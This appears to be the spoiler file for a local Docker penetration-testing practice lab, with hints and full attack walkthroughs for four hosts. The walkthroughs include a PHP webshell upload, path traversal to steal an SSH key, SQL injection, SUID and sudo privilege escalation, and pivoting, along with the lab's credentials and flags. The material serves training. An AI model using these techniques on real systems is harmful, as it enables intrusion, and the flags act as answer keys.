# Spoilers — local Docker range

**Stop.** Work each host from [README.md](README.md) first. This file is for when you are stuck or verifying the lab still works.

---

## Hint ladder (read one line at a time)

### harbor

1. Look at HTML comments and `robots.txt`.
2. The upload filter is an extension blacklist, not a parser.
3. Apache is configured to execute more than `.php`.
4. Root runs a script on a schedule. Check who can write that script (`pspy` / cron dirs / `/usr/local/bin`).

### ledger

1. `?page=` is not limited to the three links.
2. Directory traversal from the web root reaches `/home/dev`.
3. Keys and notes in the home directory; SSH is on 22 (published 2212).
4. `sudo -l` — GTFOBins the allowed binary.

### catalog

1. Login talks to SQLite with string concatenation.
2. UNION the `users` table (username / password / role).
3. Admin password is reused on SSH.
4. A SUID helper runs a **relative** command.

### chain (MS01 → APP01 → DC01)

1. You already have `jdoe` / `Winter2024!` on MS01. Read the home directory like an assumed-breach exam set.
2. `ip a` — second interface is the whole point.
3. APP01 is only on `172.28.20.0/24`. Jump or SOCKS; do not expect a host route.
4. Payroll web config still has DC admin plaintext.

---

## Full paths (lab QA)

### harbor — upload → cron

```bash
# enum
curl -s http://127.0.0.1:8011/robots.txt
curl -s http://127.0.0.1:8011/ | grep TODO

# webshell (blacklist misses phtml)
printf '<?php system($_GET["c"]); ?>' > /tmp/x.phtml
curl -F invoice=@/tmp/x.phtml http://127.0.0.1:8011/upload.php
curl -s 'http://127.0.0.1:8011/uploads/x.phtml?c=id;cat+/home/apache/local.txt'

# privesc: /usr/local/bin/backup.sh is mode 777, root cron every minute
# overwrite with a reverse shell or `cp /bin/bash /tmp/rootbash; chmod 4755 ...`
# proof: /root/proof.txt
```

`local.txt` = `OSCP-PREP-local-harbor-7c4e91aa`  
`proof.txt` = `OSCP-PREP-proof-harbor-b1d83f02`

### ledger — LFI → sudo find

```text
http://127.0.0.1:8012/index.php?page=../../../../../home/dev/notes.txt
http://127.0.0.1:8012/index.php?page=../../../../../home/dev/.ssh/id_rsa
```

```bash
# save key, SSH (or password LedgerDev2024!)
ssh -i id_rsa -p 2212 dev@127.0.0.1
sudo /usr/bin/find / -exec /bin/bash -p \; -quit
# local: /home/dev/local.txt   proof: /root/proof.txt
```

`local.txt` = `OSCP-PREP-local-ledger-2e91c0bb`  
`proof.txt` = `OSCP-PREP-proof-ledger-88a14d77`

### catalog — SQLi → SUID PATH

```bash
curl -s -d "username=guest' UNION SELECT username, password FROM users--&password=x" \
  http://127.0.0.1:8013/login.php

ssh -p 2213 catalog_admin@127.0.0.1   # SummerCatalog1

# SUID /usr/local/bin/dbmaint → system("dbdump")
printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod 4755 /tmp/rootbash\n' > /tmp/dbdump
chmod +x /tmp/dbdump
PATH=/tmp:$PATH /usr/local/bin/dbmaint
/tmp/rootbash -p
```

`local.txt` = `OSCP-PREP-local-catalog-c5a02e19`  
`proof.txt` = `OSCP-PREP-proof-catalog-4b77e3d0`

### chain

```bash
ssh -p 2221 jdoe@127.0.0.1          # Winter2024!
cat ~/Documents/todo.txt ~/.bash_history
ip -br a                             # 172.28.10.21 and 172.28.20.11

ssh -J jdoe@127.0.0.1:2221 svc_backup@172.28.20.12   # Summer2024!
# or browse http://172.28.20.12/config.php through the jump

ssh -J jdoe@127.0.0.1:2221 northwind_admin@172.28.20.13  # NorthwindDA!
sudo -i
cat /root/proof.txt
```

| Host | Flag |
|------|------|
| MS01 local | `OSCP-PREP-local-ms01-11d4a8c3` |
| APP01 local | `OSCP-PREP-local-app01-9f30be64` |
| DC01 local | `OSCP-PREP-local-dc01-e8c21a50` |
| DC01 proof | `OSCP-PREP-proof-dc01-da-6f91ab2e` |

---

If a path above fails after a compose change, fix the lab — do not “update the spoiler to match a broken box”.
